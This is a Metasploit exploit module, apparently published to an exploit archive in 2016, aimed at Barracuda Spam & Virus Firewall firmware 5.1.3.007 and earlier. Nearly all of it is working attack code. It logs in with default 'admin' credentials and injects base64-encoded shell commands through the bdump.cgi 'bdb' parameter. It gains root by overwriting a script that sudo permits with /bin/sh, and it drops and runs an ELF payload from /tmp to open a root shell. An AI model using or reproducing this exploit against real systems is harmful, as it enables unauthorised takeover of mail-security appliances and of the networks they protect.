# Date: 07/21/16
# Exploit Author: xort xort@blacksecurity.org 
# Vendor Homepage: https://www.barracuda.com/
# Software Link: https://www.barracuda.com/landing/pages/spamfirewall/
# Version: Spam and Virus Firewall <= 5.1.3.007
# Tested on: Spam & Virus Firewall 5.1.3.007 
# CVE : None.
 
require &#039;msf/core&#039;
require &#039;date&#039;
require "base64"
 
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Barracuda Spam & Virus Firewall (bdump.cgi) Post Auth Root Exploit&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a remote command execution vulnerability in
                the Barracuda Spam & Virus firewall firmware version <= 5.1.3.007 by exploiting a
                vulnerability in the web administration interface.
                    By sending a specially crafted request it&#039;s possible to inject system
                 commands while escalating to root do to relaxed sudo configuration on the local 
                machine.
            },  
            &#039;Author&#039;         => [ &#039;xort&#039; ], # disclosure and exploit module
            &#039;References&#039;     => [ [ &#039;none&#039;, &#039;none&#039;] ],
            &#039;Platform&#039;       => [ &#039;linux&#039;],
            &#039;Targets&#039; => [[&#039;Spam Firewall firmware: 5x&#039;, {}]],
            &#039;DefaultTarget&#039;  => 0 ))
 
            register_options(
                [
                    OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password&#039;, "admin" ]),  
                        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Admin Username&#039;, "admin" ]), 
                    OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),  
                    Opt::RPORT(8000),
                ], self.class)
    end
 
    def do_login(username, password_clear, et)
        vprint_status( "Logging into machine with credentials...\n" )
         
            # vars
        timeout = 1550;
        enc_key = Rex::Text.rand_text_hex(32)
         
        # send request  
            res = send_request_cgi(
                {
                      &#039;method&#039;  => &#039;POST&#039;,
                      &#039;uri&#039;     => "/cgi-mod/index.cgi",
              &#039;vars_post&#039; =>
                {
                  &#039;password_clear&#039; => password_clear,
                  &#039;real_user&#039; => "",
                  &#039;login_state&#039; => "out",
                  &#039;enc_key&#039; => enc_key,
                  &#039;et&#039; => et,
                  &#039;locale&#039; => "en_US",
                  &#039;user&#039; => username,
                  &#039;password&#039; => Digest::MD5.hexdigest(username+enc_key),
                  &#039;enctype&#039; => "MD5",
                  &#039;password_entry&#039; => "",
                }
                }, timeout)
 
            # get rid of first yank 
            password = res.body.split(&#039;\n&#039;).grep(/(.*)id=\"password\" value=\"(.*)\"/){$2}[0] #change to match below for more exact result
        et = res.body.split(&#039;\n&#039;).grep(/(.*)id=\"et\" value=\"([^\"]+)\"/){$2}[0]
 
        return password, et
    end
 
    def run_command(username, password, et, cmd)
 
                # file to replace
                sudo_cmd_exec = "/home/product/code/firmware/current/bin/mysql_add_cluster_user.sh"
 
        sudo_run_cmd_1 = "sudo /bin/cp /bin/sh #{sudo_cmd_exec} ; sudo /bin/chmod +x #{sudo_cmd_exec}"
        sudo_run_cmd_2 = "sudo #{sudo_cmd_exec} -c "
 
        vprint_status( "Running Command...\n" )
 
                # random filename to dump too + &#039;tmp&#039; HAS to be here.
                b64dumpfile = "/tmp/" + rand_text_alphanumeric(4+rand(4))
 
                # decoder stubs - tells &#039;base64&#039; command to decode and dump data to temp file
                b64decode1 = "echo \""
                b64decode2 = "\" | base64 -d >" + b64dumpfile
 
                # base64 - encode with base64 so we can send special chars and multiple lines
        cmd = Base64.strict_encode64(cmd) 
 
                # Create injection string. 
                #      a) package the  base64 decoder with encoded bytes
                #      b) attach a chmod +x request to make the script created (b64dumpfile) executable
                #      c) execute decoded base64 dumpfile
 
                injection_string = b64decode1 + cmd + b64decode2 + "; /bin/chmod +x " + b64dumpfile + "; " + sudo_run_cmd_1 + "; " + sudo_run_cmd_2 + b64dumpfile + " ; rm " + b64dumpfile
     
        vprint_status( "sending..." )
            res = send_request_cgi({
               &#039;method&#039; => &#039;GET&#039;,
               &#039;uri&#039;    => "/cgi-mod/bdump.cgi",
           &#039;headers&#039; => 
            {
                &#039;Accept&#039; => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                &#039;UserAgent&#039; => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
                &#039;Accept-Language&#039; => "en-US,en;q=0.5"
            },
            &#039;vars_get&#039; => {
                    &#039;password&#039; => password, 
                    &#039;et&#039; => et,
                    &#039;user&#039; => username,
                    &#039;role&#039; => &#039;admin&#039;,
            &#039;_dc&#039; => &#039;&#039;,
                    &#039;bdb&#039; => &#039;`&#039; + injection_string + &#039;`&#039;,
                    &#039;locale&#039; => &#039;en_US&#039;
                }
            })  
    end
 
    def exploit
 
        # params
        timeout = 1550;
 
                real_user = "";
        et = Time.now.to_i  
        user = datastore[&#039;USERNAME&#039;]
        password = datastore[&#039;PASSWORD&#039;]
 
        # do login and get password hash
        password_hash, et = do_login(user, password, et)
        vprint_status("got password hash: #{password_hash}\n")
        sleep(2)
     
        # clean up hanging prior request    
        run_command(user, password_hash, et, ("ps -df|grep bdump|awk &#039;{print $2}&#039; | xargs kill -9"))
        sleep(5)
 
                #if no &#039;CMD&#039; string - add code for root shell
        if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?
 
            cmd = datastore[&#039;CMD&#039;]  
             
            # Encode cmd payload    
            encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;) 
 
            run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/n ;printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n ; /tmp/n" ))
        else   
            # Encode payload to ELF file for deployment 
            elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;) 
 
            run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/m ;printf \"#{encoded_elf}\" > /tmp/m; chmod +rx /tmp/m ; /tmp/m" ))
         
            handler
        end
    end
end

